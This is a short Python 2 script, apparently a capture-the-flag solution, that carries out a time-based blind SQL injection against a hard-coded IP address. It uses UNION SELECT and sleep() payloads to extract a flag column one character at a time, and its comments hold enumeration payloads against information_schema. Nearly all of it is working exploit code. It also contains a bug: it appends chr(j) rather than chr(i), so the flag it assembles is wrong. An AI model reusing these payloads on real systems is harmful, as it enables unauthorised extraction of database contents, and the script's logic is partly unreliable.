# -*- coding:utf-8 -*-
import requests
import time
flag=""
for j in xrange(1,50):
    for i in xrange(33,127):
        url="http://117.34.111.15:83/chandni-jewel'%20union%20select%20if((select%20ascii(substr(f1ag,"+str(j)+",1))%20from%20test.`fl@g`%20limit%200,1)="+str(i)+",sleep(0.4),1)%2523"
        a=time.time()
        requests.get(url)
        #print time.time()-a
        print '.',
        if time.time()-a>4:
            print chr(i)
            flag=flag+str(chr(j))
            break
print flag
#database() 5 
#database() test
#table1 fl@g
#column f1ag
#http://117.34.111.15:83/chandni-jewel' union select if((select ascii(substr(f1ag," str(j) ",1)) from test.fl@g limit 0,1)=" str(i) ",sleep(0.4),1)%23
#http://117.34.111.15:83/chandni-jewel'%20union%20select%20if((select%20length(column_name)%20from%20information_schema.columns%20limit 1,1)="+str(i)+",sleep(0.4),1)%2523
